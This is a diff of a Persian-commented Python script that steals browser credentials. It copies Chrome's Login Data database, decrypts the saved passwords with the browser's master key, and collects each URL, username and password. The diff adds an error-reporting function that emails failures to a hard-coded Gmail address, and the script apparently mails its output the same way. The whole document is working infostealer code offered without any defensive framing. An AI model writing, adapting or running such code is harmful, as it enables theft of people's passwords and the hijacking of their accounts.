@@ -26,32 +26,8 @@ def decrypt_password(password, master_key):
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         return cipher.decrypt(payload)[:-16].decode()
     except Exception as e:
+        send_error_email(f"Failed to decrypt password: {str(e)}")
         return f"Failed to decrypt: {e}"
-
-# تابع اصلی برای استخراج پسوردها
-def get_chrome_passwords():
-    # کپی کردن دیتابیس به پوشه موقت
-    db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
-    shutil.copyfile(db_path, 'LoginData.db')
-    
-    conn = sqlite3.connect('LoginData.db')
-    cursor = conn.cursor()
-
-    # اجرای کوئری برای استخراج داده‌ها
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    master_key = get_master_key()
-
-    data = []
-    for row in cursor.fetchall():
-        origin_url = row[0]
-        username = row[1]
-        encrypted_password = row[2]
-        decrypted_password = decrypt_password(encrypted_password, master_key)
-        data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")
-    
-    conn.close()
-    os.remove('LoginData.db')  # حذف فایل موقت دیتابیس
-    return data
 
 # تابع برای ارسال ایمیل
 def send_email(subject, body, to_email):
@@ -78,6 +54,35 @@ def send_email(subject, body, to_email):
     except Exception as e:
         print(f"Error: {e}")
 
+# تابع برای ارسال ارور به ایمیل
+def send_error_email(error_message):
+    send_email("Error in Chrome Password Extraction", error_message, "mohammadaminbaranzhe59@gmail.com")
+
+# تابع اصلی برای استخراج پسوردها
+def get_chrome_passwords():
+    # کپی کردن دیتابیس به پوشه موقت
+    db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
+    shutil.copyfile(db_path, 'LoginData.db')
+    
+    conn = sqlite3.connect('LoginData.db')
+    cursor = conn.cursor()
+
+    # اجرای کوئری برای استخراج داده‌ها
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    master_key = get_master_key()
+
+    data = []
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        username = row[1]
+        encrypted_password = row[2]
+        decrypted_password = decrypt_password(encrypted_password, master_key)
+        data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")
+    
+    conn.close()
+    os.remove('LoginData.db')  # حذف فایل موقت دیتابیس
+    return data
+
 if __name__ == '__main__':
     try:
         passwords = get_chrome_passwords()
@@ -90,4 +95,5 @@ if __name__ == '__main__':
         else:
             print("No passwords found")
     except Exception as e:
+        send_error_email(f"Error: {str(e)}")
         print(f"Error: {e}")
